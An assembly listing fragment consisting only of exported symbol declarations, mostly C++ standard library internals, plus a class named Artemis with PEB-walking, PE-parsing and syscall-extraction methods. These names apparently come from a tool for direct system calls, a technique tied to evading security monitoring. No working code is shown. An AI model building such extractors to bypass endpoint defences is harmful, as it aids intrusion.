PUBLIC	??_Gbad_cast@std@@UEAAPEAXI@Z			; std::bad_cast::`scalar deleting destructor'
PUBLIC	?_Throw_bad_cast@std@@YAXXZ			; std::_Throw_bad_cast
PUBLIC	??1_Facet_base@std@@UEAA@XZ			; std::_Facet_base::~_Facet_base
PUBLIC	??0_Facet_base@std@@QEAA@XZ			; std::_Facet_base::_Facet_base
PUBLIC	??_G_Facet_base@std@@UEAAPEAXI@Z		; std::_Facet_base::`scalar deleting destructor'
PUBLIC	??0_Locinfo@std@@QEAA@PEBD@Z			; std::_Locinfo::_Locinfo
PUBLIC	??1_Locinfo@std@@QEAA@XZ			; std::_Locinfo::~_Locinfo
PUBLIC	?_Getctype@_Locinfo@std@@QEBA?AU_Ctypevec@@XZ	; std::_Locinfo::_Getctype
PUBLIC	?_Getcvt@_Locinfo@std@@QEBA?AU_Cvtvec@@XZ	; std::_Locinfo::_Getcvt
PUBLIC	?_Getlconv@_Locinfo@std@@QEBAPEBUlconv@@XZ	; std::_Locinfo::_Getlconv
PUBLIC	?_Getfalse@_Locinfo@std@@QEBAPEBDXZ		; std::_Locinfo::_Getfalse
PUBLIC	?_Gettrue@_Locinfo@std@@QEBAPEBDXZ		; std::_Locinfo::_Gettrue
PUBLIC	??0?$_Yarn@D@std@@QEAA@XZ			; std::_Yarn<char>::_Yarn<char>
PUBLIC	??1?$_Yarn@D@std@@QEAA@XZ			; std::_Yarn<char>::~_Yarn<char>
PUBLIC	?c_str@?$_Yarn@D@std@@QEBAPEBDXZ		; std::_Yarn<char>::c_str
PUBLIC	?_Tidy@?$_Yarn@D@std@@AEAAXXZ			; std::_Yarn<char>::_Tidy
PUBLIC	??0?$_Yarn@_W@std@@QEAA@XZ			; std::_Yarn<wchar_t>::_Yarn<wchar_t>
PUBLIC	??1?$_Yarn@_W@std@@QEAA@XZ			; std::_Yarn<wchar_t>::~_Yarn<wchar_t>
PUBLIC	?_Tidy@?$_Yarn@_W@std@@AEAAXXZ			; std::_Yarn<wchar_t>::_Tidy
PUBLIC	??0id@locale@std@@QEAA@_K@Z			; std::locale::id::id
PUBLIC	??Bid@locale@std@@QEAA_KXZ			; std::locale::id::operator unsigned __int64
PUBLIC	?_Incref@facet@locale@std@@UEAAXXZ		; std::locale::facet::_Incref
PUBLIC	?_Decref@facet@locale@std@@UEAAPEAV_Facet_base@3@XZ ; std::locale::facet::_Decref
PUBLIC	??0facet@locale@std@@IEAA@_K@Z			; std::locale::facet::facet
PUBLIC	??1facet@locale@std@@MEAA@XZ			; std::locale::facet::~facet
PUBLIC	??_Gfacet@locale@std@@MEAAPEAXI@Z		; std::locale::facet::`scalar deleting destructor'
PUBLIC	??0locale@std@@QEAA@AEBV01@@Z			; std::locale::locale
PUBLIC	??1locale@std@@QEAA@XZ				; std::locale::~locale
PUBLIC	?c_str@locale@std@@QEBAPEBDXZ			; std::locale::c_str
PUBLIC	?_Getfacet@locale@std@@QEBAPEBVfacet@12@_K@Z	; std::locale::_Getfacet
PUBLIC	??$_Adl_verify_range@PEBDPEBD@std@@YAXAEBQEBD0@Z ; std::_Adl_verify_range<char const *,char const *>
PUBLIC	??$_Adl_verify_range@PEB_WPEB_W@std@@YAXAEBQEB_W0@Z ; std::_Adl_verify_range<wchar_t const *,wchar_t const *>
PUBLIC	??0ctype_base@std@@QEAA@_K@Z			; std::ctype_base::ctype_base
PUBLIC	??1ctype_base@std@@UEAA@XZ			; std::ctype_base::~ctype_base
PUBLIC	??_Gctype_base@std@@UEAAPEAXI@Z			; std::ctype_base::`scalar deleting destructor'
PUBLIC	?widen@?$ctype@D@std@@QEBADD@Z			; std::ctype<char>::widen
PUBLIC	?widen@?$ctype@D@std@@QEBAPEBDPEBD0PEAD@Z	; std::ctype<char>::widen
PUBLIC	??0?$ctype@D@std@@QEAA@AEBV_Locinfo@1@_K@Z	; std::ctype<char>::ctype<char>
PUBLIC	?_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z ; std::ctype<char>::_Getcat
PUBLIC	??1?$ctype@D@std@@MEAA@XZ			; std::ctype<char>::~ctype<char>
PUBLIC	?_Init@?$ctype@D@std@@IEAAXAEBV_Locinfo@2@@Z	; std::ctype<char>::_Init
PUBLIC	?_Tidy@?$ctype@D@std@@IEAAXXZ			; std::ctype<char>::_Tidy
PUBLIC	?do_tolower@?$ctype@D@std@@MEBADD@Z		; std::ctype<char>::do_tolower
PUBLIC	?do_tolower@?$ctype@D@std@@MEBAPEBDPEADPEBD@Z	; std::ctype<char>::do_tolower
PUBLIC	?do_toupper@?$ctype@D@std@@MEBADD@Z		; std::ctype<char>::do_toupper
PUBLIC	?do_toupper@?$ctype@D@std@@MEBAPEBDPEADPEBD@Z	; std::ctype<char>::do_toupper
PUBLIC	?do_widen@?$ctype@D@std@@MEBADD@Z		; std::ctype<char>::do_widen
PUBLIC	?do_widen@?$ctype@D@std@@MEBAPEBDPEBD0PEAD@Z	; std::ctype<char>::do_widen
PUBLIC	?do_narrow@?$ctype@D@std@@MEBADDD@Z		; std::ctype<char>::do_narrow
PUBLIC	?do_narrow@?$ctype@D@std@@MEBAPEBDPEBD0DPEAD@Z	; std::ctype<char>::do_narrow
PUBLIC	??_G?$ctype@D@std@@MEAAPEAXI@Z			; std::ctype<char>::`scalar deleting destructor'
PUBLIC	??$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z ; std::use_facet<std::ctype<char> >
PUBLIC	??$_Adl_verify_range@PEADPEBD@std@@YAXAEBQEADAEBQEBD@Z ; std::_Adl_verify_range<char *,char const *>
PUBLIC	?is@?$ctype@_W@std@@QEBA_NF_W@Z			; std::ctype<wchar_t>::is
PUBLIC	?widen@?$ctype@_W@std@@QEBA_WD@Z		; std::ctype<wchar_t>::widen
PUBLIC	??0?$ctype@_W@std@@QEAA@AEBV_Locinfo@1@_K@Z	; std::ctype<wchar_t>::ctype<wchar_t>
PUBLIC	?_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z ; std::ctype<wchar_t>::_Getcat
PUBLIC	??1?$ctype@_W@std@@MEAA@XZ			; std::ctype<wchar_t>::~ctype<wchar_t>
PUBLIC	?_Init@?$ctype@_W@std@@IEAAXAEBV_Locinfo@2@@Z	; std::ctype<wchar_t>::_Init
PUBLIC	?do_is@?$ctype@_W@std@@MEBA_NF_W@Z		; std::ctype<wchar_t>::do_is
PUBLIC	?do_is@?$ctype@_W@std@@MEBAPEB_WPEB_W0PEAF@Z	; std::ctype<wchar_t>::do_is
PUBLIC	?do_scan_is@?$ctype@_W@std@@MEBAPEB_WFPEB_W0@Z	; std::ctype<wchar_t>::do_scan_is
PUBLIC	?do_scan_not@?$ctype@_W@std@@MEBAPEB_WFPEB_W0@Z	; std::ctype<wchar_t>::do_scan_not
PUBLIC	?do_tolower@?$ctype@_W@std@@MEBA_W_W@Z		; std::ctype<wchar_t>::do_tolower
PUBLIC	?do_tolower@?$ctype@_W@std@@MEBAPEB_WPEA_WPEB_W@Z ; std::ctype<wchar_t>::do_tolower
PUBLIC	?do_toupper@?$ctype@_W@std@@MEBA_W_W@Z		; std::ctype<wchar_t>::do_toupper
PUBLIC	?do_toupper@?$ctype@_W@std@@MEBAPEB_WPEA_WPEB_W@Z ; std::ctype<wchar_t>::do_toupper
PUBLIC	?_Dowiden@?$ctype@_W@std@@IEBA_WD@Z		; std::ctype<wchar_t>::_Dowiden
PUBLIC	?do_widen@?$ctype@_W@std@@MEBA_WD@Z		; std::ctype<wchar_t>::do_widen
PUBLIC	?do_widen@?$ctype@_W@std@@MEBAPEBDPEBD0PEA_W@Z	; std::ctype<wchar_t>::do_widen
PUBLIC	?_Donarrow@?$ctype@_W@std@@IEBAD_WD@Z		; std::ctype<wchar_t>::_Donarrow
PUBLIC	?do_narrow@?$ctype@_W@std@@MEBAD_WD@Z		; std::ctype<wchar_t>::do_narrow
PUBLIC	?do_narrow@?$ctype@_W@std@@MEBAPEB_WPEB_W0DPEAD@Z ; std::ctype<wchar_t>::do_narrow
PUBLIC	??_G?$ctype@_W@std@@MEAAPEAXI@Z			; std::ctype<wchar_t>::`scalar deleting destructor'
PUBLIC	??$_Adl_verify_range@PEA_WPEB_W@std@@YAXAEBQEA_WAEBQEB_W@Z ; std::_Adl_verify_range<wchar_t *,wchar_t const *>
PUBLIC	??0failure@ios_base@std@@QEAA@PEBDAEBVerror_code@2@@Z ; std::ios_base::failure::failure
PUBLIC	??1failure@ios_base@std@@UEAA@XZ		; std::ios_base::failure::~failure
PUBLIC	??0failure@ios_base@std@@QEAA@AEBV012@@Z	; std::ios_base::failure::failure
PUBLIC	??_Gfailure@ios_base@std@@UEAAPEAXI@Z		; std::ios_base::failure::`scalar deleting destructor'
PUBLIC	?clear@ios_base@std@@QEAAXH_N@Z			; std::ios_base::clear
PUBLIC	?rdstate@ios_base@std@@QEBAHXZ			; std::ios_base::rdstate
PUBLIC	?good@ios_base@std@@QEBA_NXZ			; std::ios_base::good
PUBLIC	?flags@ios_base@std@@QEBAHXZ			; std::ios_base::flags
PUBLIC	?setf@ios_base@std@@QEAAHHH@Z			; std::ios_base::setf
PUBLIC	?precision@ios_base@std@@QEBA_JXZ		; std::ios_base::precision
PUBLIC	?width@ios_base@std@@QEBA_JXZ			; std::ios_base::width
PUBLIC	?width@ios_base@std@@QEAA_J_J@Z			; std::ios_base::width
PUBLIC	?getloc@ios_base@std@@QEBA?AVlocale@2@XZ	; std::ios_base::getloc
PUBLIC	?hex@std@@YAAEAVios_base@1@AEAV21@@Z		; std::hex
PUBLIC	??0LDR_DATA_TABLE_ENTRY@@QEAA@XZ		; LDR_DATA_TABLE_ENTRY::LDR_DATA_TABLE_ENTRY
PUBLIC	??1LDR_DATA_TABLE_ENTRY@@QEAA@XZ		; LDR_DATA_TABLE_ENTRY::~LDR_DATA_TABLE_ENTRY
PUBLIC	?walkPEB@Artemis@@QEAAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z ; Artemis::walkPEB
PUBLIC	?walkPE@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; Artemis::walkPE
PUBLIC	?syscallExtractor@Artemis@@QEAAH_K@Z		; Artemis::syscallExtractor
PUBLIC	?readUnicodeArrayFrom64BitPointer@Artemis@@QEAA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K@Z ; Artemis::readUnicodeArrayFrom64BitPointer
PUBLIC	?controller@Artemis@@QEAAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; Artemis::controller
PUBLIC	??0Artemis@@QEAA@XZ				; Artemis::Artemis
PUBLIC	??1Artemis@@QEAA@XZ				; Artemis::~Artemis
PUBLIC	?clear@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::clear
PUBLIC	?setstate@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::setstate
PUBLIC	?tie@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBAPEAV?$basic_ostream@_WU?$char_traits@_W@std@@@2@XZ ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::tie
PUBLIC	?rdbuf@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBAPEAV?$basic_streambuf@_WU?$char_traits@_W@std@@@2@XZ ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::rdbuf
PUBLIC	?fill@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBA_WXZ ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::fill
PUBLIC	?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::_Osfx
PUBLIC	?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::flush
PUBLIC	??$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z ; std::operator<<<wchar_t,std::char_traits<wchar_t> >
PUBLIC	??$?6_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@AEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@@Z ; std::operator<<<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??0?$vector@DV?$allocator@D@std@@@std@@QEAA@XZ	; std::vector<char,std::allocator<char> >::vector<char,std::allocator<char> >
PUBLIC	??1?$vector@DV?$allocator@D@std@@@std@@QEAA@XZ	; std::vector<char,std::allocator<char> >::~vector<char,std::allocator<char> >
PUBLIC	?push_back@?$vector@DV?$allocator@D@std@@@std@@QEAAXAEBD@Z ; std::vector<char,std::allocator<char> >::push_back
PUBLIC	?clear@?$vector@DV?$allocator@D@std@@@std@@QEAAXXZ ; std::vector<char,std::allocator<char> >::clear
PUBLIC	?size@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ ; std::vector<char,std::allocator<char> >::size
PUBLIC	?max_size@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ ; std::vector<char,std::allocator<char> >::max_size
PUBLIC	?capacity@?$vector@DV?$allocator@D@std@@@std@@QEBA_KXZ ; std::vector<char,std::allocator<char> >::capacity
PUBLIC	??A?$vector@DV?$allocator@D@std@@@std@@QEAAAEAD_K@Z ; std::vector<char,std::allocator<char> >::operator[]
PUBLIC	?_Calculate_growth@?$vector@DV?$allocator@D@std@@@std@@AEBA_K_K@Z ; std::vector<char,std::allocator<char> >::_Calculate_growth
PUBLIC	?_Change_array@?$vector@DV?$allocator@D@std@@@std@@AEAAXQEAD_K1@Z ; std::vector<char,std::allocator<char> >::_Change_array
PUBLIC	?_Tidy@?$vector@DV?$allocator@D@std@@@std@@AEAAXXZ ; std::vector<char,std::allocator<char> >::_Tidy
PUBLIC	?_Xlength@?$vector@DV?$allocator@D@std@@@std@@CAXXZ ; std::vector<char,std::allocator<char> >::_Xlength
PUBLIC	?_Orphan_range@?$vector@DV?$allocator@D@std@@@std@@AEBAXPEAD0@Z ; std::vector<char,std::allocator<char> >::_Orphan_range
PUBLIC	?_Getal@?$vector@DV?$allocator@D@std@@@std@@AEAAAEAV?$allocator@D@2@XZ ; std::vector<char,std::allocator<char> >::_Getal
PUBLIC	?_Getal@?$vector@DV?$allocator@D@std@@@std@@AEBAAEBV?$allocator@D@2@XZ ; std::vector<char,std::allocator<char> >::_Getal
PUBLIC	??0?$_Vector_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ ; std::_Vector_val<std::_Simple_types<char> >::_Vector_val<std::_Simple_types<char> >
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_Vector_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAAAEAV?$allocator@D@2@XZ ; std::_Compressed_pair<std::allocator<char>,std::_Vector_val<std::_Simple_types<char> >,1>::_Get_first
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_Vector_val@U?$_Simple_types@D@std@@@2@$00@std@@QEBAAEBV?$allocator@D@2@XZ ; std::_Compressed_pair<std::allocator<char>,std::_Vector_val<std::_Simple_types<char> >,1>::_Get_first
PUBLIC	??0?$allocator@E@std@@QEAA@XZ			; std::allocator<unsigned char>::allocator<unsigned char>
PUBLIC	?deallocate@?$allocator@E@std@@QEAAXQEAE_K@Z	; std::allocator<unsigned char>::deallocate
PUBLIC	?allocate@?$allocator@E@std@@QEAAPEAE_K@Z	; std::allocator<unsigned char>::allocate
PUBLIC	?max_size@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SA_KAEBV?$allocator@E@2@@Z ; std::_Default_allocator_traits<std::allocator<unsigned char> >::max_size
PUBLIC	??0?$vector@EV?$allocator@E@std@@@std@@QEAA@XZ	; std::vector<unsigned char,std::allocator<unsigned char> >::vector<unsigned char,std::allocator<unsigned char> >
PUBLIC	??1?$vector@EV?$allocator@E@std@@@std@@QEAA@XZ	; std::vector<unsigned char,std::allocator<unsigned char> >::~vector<unsigned char,std::allocator<unsigned char> >
PUBLIC	?push_back@?$vector@EV?$allocator@E@std@@@std@@QEAAXAEBE@Z ; std::vector<unsigned char,std::allocator<unsigned char> >::push_back
PUBLIC	?max_size@?$vector@EV?$allocator@E@std@@@std@@QEBA_KXZ ; std::vector<unsigned char,std::allocator<unsigned char> >::max_size
PUBLIC	?capacity@?$vector@EV?$allocator@E@std@@@std@@QEBA_KXZ ; std::vector<unsigned char,std::allocator<unsigned char> >::capacity
PUBLIC	?_Calculate_growth@?$vector@EV?$allocator@E@std@@@std@@AEBA_K_K@Z ; std::vector<unsigned char,std::allocator<unsigned char> >::_Calculate_growth
PUBLIC	?_Change_array@?$vector@EV?$allocator@E@std@@@std@@AEAAXQEAE_K1@Z ; std::vector<unsigned char,std::allocator<unsigned char> >::_Change_array
PUBLIC	?_Tidy@?$vector@EV?$allocator@E@std@@@std@@AEAAXXZ ; std::vector<unsigned char,std::allocator<unsigned char> >::_Tidy
PUBLIC	?_Xlength@?$vector@EV?$allocator@E@std@@@std@@CAXXZ ; std::vector<unsigned char,std::allocator<unsigned char> >::_Xlength
PUBLIC	?_Orphan_range@?$vector@EV?$allocator@E@std@@@std@@AEBAXPEAE0@Z ; std::vector<unsigned char,std::allocator<unsigned char> >::_Orphan_range
PUBLIC	?_Getal@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAV?$allocator@E@2@XZ ; std::vector<unsigned char,std::allocator<unsigned char> >::_Getal
PUBLIC	?_Getal@?$vector@EV?$allocator@E@std@@@std@@AEBAAEBV?$allocator@E@2@XZ ; std::vector<unsigned char,std::allocator<unsigned char> >::_Getal
PUBLIC	??0?$_Vector_val@U?$_Simple_types@E@std@@@std@@QEAA@XZ ; std::_Vector_val<std::_Simple_types<unsigned char> >::_Vector_val<std::_Simple_types<unsigned char> >
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@E@std@@V?$_Vector_val@U?$_Simple_types@E@std@@@2@$00@std@@QEAAAEAV?$allocator@E@2@XZ ; std::_Compressed_pair<std::allocator<unsigned char>,std::_Vector_val<std::_Simple_types<unsigned char> >,1>::_Get_first
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@E@std@@V?$_Vector_val@U?$_Simple_types@E@std@@@2@$00@std@@QEBAAEBV?$allocator@E@2@XZ ; std::_Compressed_pair<std::allocator<unsigned char>,std::_Vector_val<std::_Simple_types<unsigned char> >,1>::_Get_first
PUBLIC	??0?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ ; std::vector<wchar_t,std::allocator<wchar_t> >::vector<wchar_t,std::allocator<wchar_t> >
PUBLIC	??1?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ ; std::vector<wchar_t,std::allocator<wchar_t> >::~vector<wchar_t,std::allocator<wchar_t> >
PUBLIC	?push_back@?$vector@_WV?$allocator@_W@std@@@std@@QEAAXAEB_W@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::push_back
PUBLIC	?begin@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?AV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@2@XZ ; std::vector<wchar_t,std::allocator<wchar_t> >::begin
PUBLIC	?end@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?AV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@2@XZ ; std::vector<wchar_t,std::allocator<wchar_t> >::end
PUBLIC	?max_size@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ ; std::vector<wchar_t,std::allocator<wchar_t> >::max_size
PUBLIC	?capacity@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ ; std::vector<wchar_t,std::allocator<wchar_t> >::capacity
PUBLIC	?_Calculate_growth@?$vector@_WV?$allocator@_W@std@@@std@@AEBA_K_K@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Calculate_growth
PUBLIC	?_Change_array@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXQEA_W_K1@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Change_array
PUBLIC	?_Tidy@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXXZ ; std::vector<wchar_t,std::allocator<wchar_t> >::_Tidy
PUBLIC	?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ ; std::vector<wchar_t,std::allocator<wchar_t> >::_Xlength
PUBLIC	?_Orphan_range@?$vector@_WV?$allocator@_W@std@@@std@@AEBAXPEA_W0@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Orphan_range
PUBLIC	?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::vector<wchar_t,std::allocator<wchar_t> >::_Getal
PUBLIC	?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::vector<wchar_t,std::allocator<wchar_t> >::_Getal
PUBLIC	??0?$_Vector_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_Vector_val<std::_Simple_types<wchar_t> >::_Vector_val<std::_Simple_types<wchar_t> >
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	??0?$_Vector_const_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEA_WPEBU_Container_base0@1@@Z ; std::_Vector_const_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >::_Vector_const_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >
PUBLIC	?_Unwrapped@?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEBAPEA_WXZ ; std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >::_Unwrapped
PUBLIC	??0?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEA_WPEBU_Container_base0@1@@Z ; std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >
PUBLIC	??$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> ><std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >,0>
PUBLIC	main
PUBLIC	?clear@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::clear
PUBLIC	?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate
PUBLIC	?tie@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBAPEAV?$basic_ostream@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::tie
PUBLIC	?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBAPEAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
PUBLIC	?fill@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADXZ ; std::basic_ios<char,std::char_traits<char> >::fill
PUBLIC	?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z ; std::basic_ios<char,std::char_traits<char> >::widen
PUBLIC	?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ ; std::basic_ostream<char,std::char_traits<char> >::_Osfx
PUBLIC	??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAV01@AEAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<
PUBLIC	??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAVios_base@1@AEAV21@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<
PUBLIC	??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<
PUBLIC	??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<
PUBLIC	?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z ; std::basic_ostream<char,std::char_traits<char> >::put
PUBLIC	?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ ; std::basic_ostream<char,std::char_traits<char> >::flush
PUBLIC	??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z ; std::operator<<<std::char_traits<char> >
PUBLIC	??$endl@DU?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@@Z ; std::endl<char,std::char_traits<char> >
PUBLIC	??0_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::_Sentry_base
PUBLIC	??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::~_Sentry_base
PUBLIC	??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z ; std::basic_ostream<char,std::char_traits<char> >::sentry::sentry
PUBLIC	??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry
PUBLIC	??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEBA_NXZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::operator bool
PUBLIC	??$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z ; std::use_facet<std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > > >
PUBLIC	?_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Getcat
PUBLIC	??1?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEAA@XZ ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::~num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >
PUBLIC	?_Init@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@IEAAXAEBV_Locinfo@2@@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Init
PUBLIC	??0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >
PUBLIC	?put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DJ@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::put
PUBLIC	?put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBX@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::put
PUBLIC	?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put
PUBLIC	?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DJ@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put
